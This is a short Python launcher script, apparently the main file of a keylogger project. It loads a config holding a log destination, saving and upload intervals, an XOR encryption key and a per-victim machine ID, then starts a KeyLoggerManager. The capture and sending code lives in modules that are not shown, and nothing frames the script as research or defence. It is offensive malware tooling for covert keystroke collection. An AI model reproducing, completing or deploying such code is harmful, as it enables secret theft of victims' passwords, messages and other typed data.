from encryptions.xor import Xor
from keylogger.manager import KeyLoggerManager
from config import CONFIG

if __name__ == "__main__":

    destination = CONFIG["destination"]
    saving = CONFIG["saving"]
    save_interval_value = CONFIG["save_interval_value"]
    save_interval_unit = CONFIG["save_interval_unit"]
    container_interval_value = CONFIG["container_interval_value"]
    container_interval_unit = CONFIG["container_interval_units"]
    encryption = CONFIG["encryption"]
    key_encryption = CONFIG["key_encryption"]
    machine_id = CONFIG["machine_id"]

    m = KeyLoggerManager(destination, saving, save_interval_value, 
                         save_interval_unit, container_interval_value, 
                         container_interval_unit, encryption, key_encryption, 
                         machine_id)
    m.run()
